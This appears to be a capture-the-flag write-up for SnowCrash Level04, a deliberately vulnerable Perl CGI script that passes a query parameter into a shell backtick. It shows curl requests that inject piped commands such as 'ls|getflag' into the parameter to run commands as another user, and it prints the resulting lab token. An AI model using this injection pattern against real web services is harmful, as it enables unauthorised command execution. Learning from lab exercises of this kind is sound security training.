# Level04

```bash
level04@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
-r-x------  1 level04 level04  675 Apr  3  2012 .profile
```

```perl
level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

```bash
level04@SnowCrash:~$ ./level04.pl
Content-type: text/html
```

### Finding the server

- A quick search to know how this CGI stuff works...

https://www.cs.ait.ac.th/~on/O/oreilly/perl/learn32/ch18_04.htm

- Find the server behind this

```bash
level04@SnowCrash:~$ netstat -plnt
(No info could be read for "-p": geteuid()=2004 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:4242            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::4646                 :::*                    LISTEN      -
tcp6       0      0 :::4747                 :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::4242                 :::*                    LISTEN      -
```

```html
level04@SnowCrash:~$ curl  localhost:4646/level04.pl?x=test
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /level04.pl was not found on this server.</p>
<hr>
<address>Apache/2.2.22 (Ubuntu) Server at localhost Port 4646</address>
</body></html>
```

```bash
level04@SnowCrash:~$ curl  localhost:4747/level04.pl?x=test
test
```

```html
level04@SnowCrash:~$ curl  localhost:80/level04.pl?x=test
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /level04.pl was not found on this server.</p>
<hr>
<address>Apache/2.2.22 (Ubuntu) Server at localhost Port 80</address>
</body></html>
```

```bash
level04@SnowCrash:~$ curl  localhost:4242/level04.pl?x=test
SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.7
Protocol mismatch.
curl: (56) Recv failure: Connection reset by peer
```

### Then exploiting it

- Some documentation .... 

https://www.tutorialspoint.com/perl/perl_subroutines.htm

https://stackoverflow.com/questions/3589837/what-is-the-significance-of-an-underscore-in-perl

https://www.stat.berkeley.edu/~spector/extension/perl/notes/node73.html

https://alvinalexander.com/perl/edu/articles/pl010003.shtml

After testing some things, something made me think we're executing a shell

```bash
level04@SnowCrash:~$ curl localhost:4747/level04.pl?x='$$'
6260
```

As the code only executes the 1st parameter, I had to find a way to run `getflag` in the same command of `echo`

```bash
level04@SnowCrash:~$ curl  localhost:4747/level04.pl?x='ls | echo '
ls
```

```bash
level04@SnowCrash:~$ curl  localhost:4747/level04.pl?x='ls|whoami'
flag04
```

```bash
level04@SnowCrash:~$ curl  localhost:4747/level04.pl?x='ls|getflag'

Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

### Go to level05

```bash
su level05
Password:
<<< 'ne2searoevaevoem4ov4ar8ap'

level05@SnowCrash:~$
```
